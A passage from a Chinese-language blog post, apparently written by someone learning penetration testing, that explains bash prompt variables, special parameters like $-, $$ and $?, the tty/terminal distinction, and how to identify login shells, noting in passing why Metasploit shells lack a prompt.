&lt;p&gt;那到底什么是 &lt;code&gt;$PS1&lt;/code&gt;,看起来像一个变量，叫做 &lt;code&gt;Bash Prompt&lt;/code&gt;, 其代表的是命令行的提示符，即我们看到的终端呈现的shell每一行的开头，例如在下面这个shell中，就由三个内容组成： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;\s = bash, the name of the shell &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;\v = 3.2, the version of bash &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;$ &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;还有类似的： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$PS1, primary prompt string, shell界面每次换行后的开头标识符（如果使用了插件进行美化之后，就会发现这个值特别长，就是因为开头标识符变化了）; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;$PS2, 表示次级的标识符，secondary prompt string，通常为 &amp;gt;; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;$PS3, 用来指示选中的命令; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;$PS4, 表示命令在执行的过程中，每一行的输出都会输出 $PS4 的值 [7]; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-21_22-05-03_screenshot.png&#34;
             alt=&#34;Figure 1: $PS in Bash&#34; width=&#34;150px&#34;/&gt;&lt;figcaption&gt;
                &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 1: &lt;!-- raw HTML omitted --&gt;$PS in Bash&lt;/p&gt;
            &lt;/figcaption&gt;
    &lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;知道了这个之后，我们也就能理解为什么我们通过msf拿到的shell的每一行开头什么都没有，因此被称为非交互式的shell，因为其$PS1没有被定义，也就没有内容可以显示； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;我们平时利用一些工具对终端进行自定义美化的时候，应该也是对这些内容进行修改来实现的，大家可以试试看在自己的终端中输出这些内容，可能都是很长的输出； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;$-&lt;/p&gt;
&lt;p&gt;$-
: $-, dollar hyphen, 将会返回当前shell（bash）在开启时，所设定的option，例如当返回是himBH，就表示bash启动时设定了[8]： &lt;!-- raw HTML omitted --&gt;
-   H - histexpand: when history expansion is enabled &lt;!-- raw HTML omitted --&gt;
-   m - monitor: when job control is enabled &lt;!-- raw HTML omitted --&gt;
-   h - hashall: Locate and remember (hash) commands as they are looked up for execution &lt;!-- raw HTML omitted --&gt;
-   B - braceexpand: when brace expansion is enabled &lt;!-- raw HTML omitted --&gt;
-   i - interactive: when current shell is interactive &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;这样也就不难理解我们为什么在进行shell是否可交互时可以查看 &lt;code&gt;$-&lt;/code&gt; 的值中是否包含i了； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;$$
: $$会输出当前shell的进程ID或者说PID，每当新开启一个shell的时候，就会产生一个新的进程 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;$#
: $#用来表示一个bash命令的argument数量，例如下面的例子[9]: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ```shell
 $ bash -c ‘echo $#’ _ 1 2 3
 ```

 这里的 `_` 下划线表示一个占位符，表示后面的string为命令的arguments，要主要的是，#表示的数字并不会被算进去，因此上面指令的输出为3 &amp;lt;br/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;$0
: 显示出当前运行脚本的名字，也就是第一个argument的值； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;$?
: $?表示的是上一条命令的exit code，如果成功执行则为0，如果出现错误，就回事1； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;$!
: $!，dollar exclamation,表示上一个最近一个被执行的任务的PID； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;$_
: $_表示最近一条指令的最后一个argument； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-21_23-10-43_screenshot.png&#34;
             alt=&#34;Figure 2: $_指示上一条指令的最后一个argument&#34; width=&#34;200px&#34;/&gt;&lt;figcaption&gt;
                &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 2: &lt;!-- raw HTML omitted --&gt;$_指示上一条指令的最后一个argument&lt;/p&gt;
            &lt;/figcaption&gt;
    &lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;区分-terminal-shell-tty-以及-console&#34;&gt;区分&amp;rsquo;terminal&amp;rsquo;, &amp;lsquo;shell&amp;rsquo;, &amp;rsquo;tty&amp;rsquo; 以及 &amp;lsquo;console&amp;rsquo;&lt;/h3&gt;
&lt;p&gt;我们通过msf获得了一个非交互式的shell之后，很多walkthrough都会教我们将其转换为完全交互式的TTY，那么这个TTY是什么呢？它和shell，console，terminal这些名词到底是什么关系呢？我们就在这里搞搞清楚。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h4 id=&#34;tty-and-terminal&#34;&gt;tty &amp;amp; terminal&lt;/h4&gt;
&lt;p&gt;tty是一种实现了除了读写以外额外命令 &lt;code&gt;device file&lt;/code&gt; 的设备文件，一般来说，terminal等价于tty。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;一些tty是由kernel内核为了硬件设备所提供的，例如键盘输入，在屏幕上输出文字，或者是对输入输出进行传输。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;另一种tty被称为 &lt;code&gt;pseudo-ttys&lt;/code&gt;, 通常由软件所提供，被称为终端仿真器，例如Xterm，Screen，SSH，等等 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;Terminal也有一种更为传统的含义，即一个提供人们与电脑进行交互的设备，通常配备键盘以及显示器。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;什么是login-shell和non-login-shell&#34;&gt;什么是Login Shell和Non-Login Shell?&lt;/h3&gt;
&lt;p&gt;&amp;ldquo;A login shell is one whose first character of argument zero is a -, or one started with the &amp;ndash;login option.&amp;rdquo; [10]. &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h4 id=&#34;如何判断&#34;&gt;如何判断？&lt;/h4&gt;
&lt;p&gt;判断一个shell是否是login shell的标准就是$0的输出字符串，其第一个字符是否是&amp;rsquo;-&amp;rsquo;，如果是，则是一个login shell; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-22_23-14-23_screenshot.png&#34;
         alt=&#34;Figure 3: 判断Login shell&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 3: &lt;!-- raw HTML omitted --&gt;判断Login shell&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;我们也可以通过输入logout命令来进行判断其是否用了 &amp;ndash;login选项，如果可以正常退出，则表示这是一个login shell，如果只能用&amp;rsquo;exit&amp;rsquo; 退出，则表示不是一个login shell &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-22_23-14-48_screenshot.png&#34;
         alt=&#34;Figure 4: Logout&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 4: &lt;!-- raw HTML omitted --&gt;Logout&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h4 id=&#34;login-shell&#34;&gt;Login shell&lt;/h4&gt;
&lt;p&gt;Login shell在启动的时候，会传递$0, 通常就是带&amp;rsquo;-&amp;lsquo;的shell名，例如 &amp;lsquo;-bash&amp;rsquo;, &amp;lsquo;-zsh&amp;rsquo;, &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;reference&#34;&gt;Reference&lt;/h3&gt;
&lt;p&gt;[1] ‘What is an Interactive Shell? (Bash Reference Manual)’. &lt;a class=&#34;link&#34; href=&#34;https://www.gnu.org/software/bash/manual/html_node/What-is-an-Interactive-Shell_003f.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.gnu.org/software/bash/manual/html_node/What-is-an-Interactive-Shell_003f.html&lt;/a&gt; (accessed Jul. 21, 2022). &lt;!-- raw HTML omitted --&gt;
[2] T. Hansson, ‘Answer to “What’s the difference between an argument and a parameter?”’, Stack Overflow, Oct. 01, 2008. &lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/a/156787/17534765&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://stackoverflow.com/a/156787/17534765&lt;/a&gt; (accessed Jul. 21, 2022). &lt;!-- raw HTML omitted --&gt;
[3] jlliagre, ‘Answer to “Difference between terms: ‘option’, ‘argument’, and ‘parameter’?”’, Stack Overflow, Apr. 08, 2016. &lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/a/36495940/17534765&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://stackoverflow.com/a/36495940/17534765&lt;/a&gt; (accessed Jul. 21, 2022). &lt;!-- raw HTML omitted --&gt;
[4] navigaid, ‘Answer to “What does bash -s do?”’, Stack Overflow, Aug. 15, 2018. &lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/a/51854728/17534765&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://stackoverflow.com/a/51854728/17534765&lt;/a&gt; (accessed Jul. 22, 2022). &lt;!-- raw HTML omitted --&gt;
[5] ‘Shell Scripting - Interactive and Non-Interactive Shell’, GeeksforGeeks, Jan. 23, 2022. &lt;a class=&#34;link&#34; href=&#34;https://www.geeksforgeeks.org/shell-scripting-interactive-and-non-interactive-shell/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.geeksforgeeks.org/shell-scripting-interactive-and-non-interactive-shell/&lt;/a&gt; (accessed Jul. 22, 2022). &lt;!-- raw HTML omitted --&gt;
[6] 毛英东, ‘什么是交互式shell和非交互式shell?’, 毛英东的个人博客, May 30, 2020. &lt;a class=&#34;link&#34; href=&#34;https://www.maoyingdong.com/what_is_a_interactive_shell/index.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.maoyingdong.com/what_is_a_interactive_shell/index.html&lt;/a&gt; (accessed Jul. 22, 2022). &lt;!-- raw HTML omitted --&gt;
[7] V. Gite, ‘How to Change / Set up bash custom prompt (PS1) in Linux’, nixCraft, Jun. 02, 2007. &lt;a class=&#34;link&#34; href=&#34;https://www.cyberciti.biz/tips/howto-linux-unix-bash-shell-setup-prompt.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cyberciti.biz/tips/howto-linux-unix-bash-shell-setup-prompt.html&lt;/a&gt; (accessed Jul. 22, 2022). &lt;!-- raw HTML omitted --&gt;
[8] anubhava, ‘Answer to “What does $- mean in Bash?”’, Stack Overflow, Mar. 13, 2017. &lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/a/42757277/17534765&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://stackoverflow.com/a/42757277/17534765&lt;/a&gt; (accessed Jul. 22, 2022). &lt;!-- raw HTML omitted --&gt;
[9] S. Ganguly, ‘How to Use Special Variables in Bash’. &lt;a class=&#34;link&#34; href=&#34;https://linuxhint.com/use-special-variables-in-bash/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://linuxhint.com/use-special-variables-in-bash/&lt;/a&gt; (accessed Jul. 22, 2022). &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
